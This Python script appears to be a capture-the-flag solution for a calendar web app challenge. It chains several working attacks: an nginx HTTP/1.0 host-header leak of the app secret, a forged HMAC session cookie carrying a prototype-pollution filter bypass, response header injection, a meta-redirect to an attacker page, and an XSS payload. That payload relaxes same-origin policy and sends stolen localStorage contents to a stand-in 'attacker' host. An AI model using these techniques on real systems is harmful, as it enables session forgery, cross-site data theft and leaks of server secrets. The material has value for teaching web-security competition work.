"""
1. abuse nginx http1.0 -> http1.1 rewrite to leak the app secret. http1.0 does not require the host header and nginx adds it for downstream requests

2. create 2 notes:
    - one with a meta redirect to our site
    - one with `<script src='/flag'></script>`

3. report to the bot the note containing the meta redirect -> gets redirected to our page
    - open the target page and set document.domain: http://{secret}.flag.chall.tld/flag?document.domain=chall.tld

4. prototype pollution filter bypass: ['__proto__'] !== '__proto__' && obj[['__proto__']] === obj['__proto__'] // true

5. craft a session cookie with prototype pollution payload using the secret

6. pollute global prototype -> response header injection
    - inject Content-Type: application/javascript so that /flag can be executed as script
    - inject Origin-Agent-Cluster that allows to relax SOP
    - pollute `host` with the xss payload

7. xss
    - set document.domain='chall.tld' to relax SOP
    - get the reference to the flag page and read the flag
"""

import requests
from pwn import *  # type: ignore # noqa: F403
import base64
import hmac
import hashlib
import secrets
import re
import threading
from flask import Flask
from urllib import parse
import time

URL = "http://localhost:80"
# URL = "http://sop-calendar-revenge.challs.m0lecon.it:32824"
SERVER = "attacker"
REQ = "GET /flag HTTP/1.0\r\n\r\n"
XSS = """(async () => {
    document.domain = `chall.tld`;
    let w = window.open(``, `flag`);
    await new Promise(r => setTimeout(r, 2000));
    try {
        let flag = w.localStorage.getItem('flag');
        location = `//{SERVER}/flag?`+flag;
    } catch(e) {
        location = `//{SERVER}/error?e`+e;
    }
})();//"""
PP = '[[[["__proto__"]]],{"Origin-Agent-Cluster":"?0","host":"{XSS}","Content-Type":"application/javascript"}]'
SECRET = None
METAID = ""
XSSID = ""

s = requests.Session()


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def sign_session_payload(encoded_payload: str, secret: bytes) -> str:
    mac = hmac.new(secret, encoded_payload.encode("utf-8"), hashlib.sha256).digest()
    return b64url_encode(mac)


def create_event(payload):
    return s.post(
        f"{URL}/events",
        data={
            "title": "any",
            "day": "1111-11-11",
            "start": "00:00",
            "end": "12:12",
            "notes": payload,
        },
    ).url


def leak_secret():
    global REQ
    r = remote(parse.urlparse(URL).hostname, parse.urlparse(URL).port)
    r.send(REQ.encode())
    rs = r.recvuntil(b"here!")
    print(rs)
    return (
        rs.decode().split("\r\n\r\n")[1].split(".app.chall.tld")[0]
    )


app = Flask(__name__)


@app.route("/pollute")
def pollute():
    global SECRET, SERVER
    payload = PP.replace(
        "{XSS}",
        XSS.replace("{SECRET}", SECRET).replace("{SERVER}", SERVER).replace("\n", " "),
    ).encode()
    encoded_payload = b64url_encode(payload)
    signature = sign_session_payload(encoded_payload, SECRET.encode())
    token = f"{encoded_payload}.{signature}"
    res = requests.get(f"{URL}/", cookies={"session": token})
    if res.headers.get("Origin-Agent-Cluster"):
        return "ok"
    return "fail"


@app.route("/")
def index():
    global XSSID, SECRET
    return """<script>
    open(`http://{SECRET}.flag.chall.tld/flag?document.domain=chall.tld`, `flag`);
    fetch('/pollute')
    setTimeout(_ => location='http://{SECRET}.app.chall.tld/events/{XSSID}', 1000);
</script>""".replace("{XSSID}", XSSID).replace("{SECRET}", SECRET)


if __name__ == "__main__":
    if not SECRET:
        SECRET = leak_secret()
        print("[+] Got the secret", SECRET)

    auth = {"username": secrets.token_urlsafe(4), "password": secrets.token_urlsafe(4)}
    res = s.post(f"{URL}/signup", data=auth)

    METAID = create_event(
        f"<meta http-equiv='refresh' content='0; http://{SERVER}/'>"
    )
    XSSID = create_event("<script src='/flag'></script>")

    METAID = re.search(r"[a-f0-9]{32}", METAID).group(0)  # type: ignore
    XSSID = re.search(r"[a-f0-9]{32}", XSSID).group(0)  # type: ignore


    def call_bot():
        time.sleep(1)
        s.post(f"{URL}/report", data={"eventId": METAID, "secret": SECRET})
        print("[+] Reported")
    threading.Thread(target=call_bot).start()

    app.run()
